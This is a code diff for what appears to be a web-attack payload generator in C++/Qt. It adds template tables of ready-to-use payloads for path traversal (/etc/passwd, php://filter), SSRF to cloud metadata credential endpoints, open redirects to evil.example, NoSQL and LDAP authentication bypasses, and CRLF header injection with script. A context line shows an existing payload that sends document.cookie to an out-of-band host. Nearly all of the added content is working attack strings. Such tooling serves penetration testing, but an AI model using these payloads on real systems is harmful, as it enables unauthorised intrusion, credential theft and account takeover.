@@ -142,6 +142,79 @@ const Tmpl kXss[] = {
      "Sends document.cookie to OAST /x (read it from the query).", true},
 };
 
+// ---- Path traversal / LFI -----------------------------------------------
+const Tmpl kLfi[] = {
+    {"classic ../ (nix)", R"PL(../../../../etc/passwd)PL",
+     "Reads /etc/passwd if the path is used unsanitized.", false},
+    {"windows ..\\", R"PL(..\..\..\..\windows\win.ini)PL", "Windows target.", false},
+    {"url-encoded", R"PL(..%2f..%2f..%2f..%2fetc%2fpasswd)PL",
+     "For filters that only block literal ../.", false},
+    {"nested-clobber bypass", R"PL(....//....//....//etc/passwd)PL",
+     "Survives a single non-recursive ../ strip.", false},
+    {"php filter (source disclosure)",
+     R"PL(php://filter/convert.base64-encode/resource=index.php)PL",
+     "Returns the base64 of the source in PHP apps.", false},
+    {"proc self environ", R"PL(/proc/self/environ)PL",
+     "Env vars (and a log-poisoning RCE primitive) on Linux.", false},
+};
+
+// ---- SSRF ---------------------------------------------------------------
+const Tmpl kSsrf[] = {
+    {"AWS IMDSv1", R"PL(http://169.254.169.254/latest/meta-data/)PL",
+     "Cloud metadata; drill into iam/security-credentials/ for keys.", false},
+    {"GCP metadata", R"PL(http://metadata.google.internal/computeMetadata/v1/)PL",
+     "Needs header Metadata-Flavor: Google.", false},
+    {"localhost", R"PL(http://127.0.0.1:80/)PL", "Hits an internal service.", false},
+    {"decimal-IP bypass", R"PL(http://2130706433/)PL",
+     "2130706433 == 127.0.0.1; slips host allow-lists.", false},
+    {"octal-IP bypass", R"PL(http://0177.0.0.1/)PL", "Octal 127.0.0.1.", false},
+    {"OOB confirm", R"PL(http://%OAST%/ssrf)PL",
+     "Blind SSRF confirmation; watch OAST /ssrf.", true},
+};
+
+// ---- Open redirect ------------------------------------------------------
+const Tmpl kRedir[] = {
+    {"scheme-relative", R"PL(//evil.example/)PL", "Redirects off-site if honored.", false},
+    {"backslash trick", R"PL(/\evil.example/)PL", "Browsers treat /\\ as //.", false},
+    {"whitelist-host prefix", R"PL(https://trusted.example.evil.example/)PL",
+     "Beats naive startsWith('trusted.example') checks.", false},
+    {"at-sign userinfo", R"PL(https://trusted.example@evil.example/)PL",
+     "Everything before @ is userinfo; host is evil.example.", false},
+    {"OOB redirect", R"PL(//%OAST%/)PL", "Watch OAST for the redirected hit.", true},
+};
+
+// ---- NoSQL injection ----------------------------------------------------
+const Tmpl kNosql[] = {
+    {"operator auth bypass (JSON)", R"PL({"username":{"$ne":null},"password":{"$ne":null}})PL",
+     "Logs in as the first user when the body is JSON.", false},
+    {"operator in query string", R"PL(username[$ne]=&password[$ne]=)PL",
+     "Same bypass via bracketed query params.", false},
+    {"$gt empty", R"PL({"password":{"$gt":""}})PL", "Truthy for any password.", false},
+    {"$regex match-all", R"PL({"username":{"$regex":".*"}})PL", "Matches any user.", false},
+    {"JS injection ($where)", R"PL(';return true;var x=')PL",
+     "For $where / server-side JS evaluation.", false},
+};
+
+// ---- LDAP injection -----------------------------------------------------
+const Tmpl kLdap[] = {
+    {"wildcard", R"PL(*)PL", "Returns all entries if injected into a filter.", false},
+    {"auth bypass", R"PL(*)(uid=*))(|(uid=*)PL", "Classic filter-breakout bypass.", false},
+    {"always-true", R"PL(*)(|(objectClass=*))PL", "Appends an always-true clause.", false},
+    {"password-attr probe", R"PL(*)(|(password=*))PL", "Tests for a readable password attr.", false},
+};
+
+// ---- CRLF / HTTP response splitting -------------------------------------
+const Tmpl kCrlf[] = {
+    {"cookie inject", R"PL(%0d%0aSet-Cookie:%20nl_inject=1)PL",
+     "A reflected Set-Cookie confirms header injection.", false},
+    {"unicode-CRLF bypass", R"PL(%E5%98%8D%E5%98%8ASet-Cookie:%20nl=1)PL",
+     "Overlong-UTF8 CR/LF that some stacks normalize.", false},
+    {"response split -> XSS", R"PL(%0d%0a%0d%0a<script>alert('%MARKER%')</script>)PL",
+     "Splits the response and injects a body.", false},
+    {"open-redirect via CRLF (OOB)", R"PL(%0d%0aLocation:%20http://%OAST%/)PL",
+     "Injected Location header; watch OAST.", true},
+};
+
 template <int N> int count(const Tmpl (&)[N]) { return N; }
 
 QList<Payload> forgeJwt(const ForgeParams &p) {
@@ -171,7 +244,9 @@ QList<Payload> forgeJwt(const ForgeParams &p) {
 
 QStringList techniques() {
     return { QStringLiteral("ssti"), QStringLiteral("cmdi"), QStringLiteral("xxe"),
-             QStringLiteral("sqli"), QStringLiteral("xss"),  QStringLiteral("jwt") };
+             QStringLiteral("sqli"), QStringLiteral("xss"),  QStringLiteral("jwt"),
+             QStringLiteral("lfi"),  QStringLiteral("ssrf"), QStringLiteral("redirect"),
+             QStringLiteral("nosqli"), QStringLiteral("ldap"), QStringLiteral("crlf") };
 }
 
 QList<Payload> forge(const QString &technique, const ForgeParams &params) {
@@ -186,6 +261,12 @@ QList<Payload> forge(const QString &technique, const ForgeParams &params) {
     if (want("sqli")) emitAll(out, QStringLiteral("sqli"), kSqli, count(kSqli), params);
     if (want("xss"))  emitAll(out, QStringLiteral("xss"),  kXss,  count(kXss),  params);
     if (want("jwt"))  out.append(forgeJwt(params));
+    if (want("lfi"))      emitAll(out, QStringLiteral("lfi"),      kLfi,   count(kLfi),   params);
+    if (want("ssrf"))     emitAll(out, QStringLiteral("ssrf"),     kSsrf,  count(kSsrf),  params);
+    if (want("redirect")) emitAll(out, QStringLiteral("redirect"), kRedir, count(kRedir), params);
+    if (want("nosqli"))   emitAll(out, QStringLiteral("nosqli"),   kNosql, count(kNosql), params);
+    if (want("ldap"))     emitAll(out, QStringLiteral("ldap"),     kLdap,  count(kLdap),  params);
+    if (want("crlf"))     emitAll(out, QStringLiteral("crlf"),     kCrlf,  count(kCrlf),  params);
     return out;
 }
 
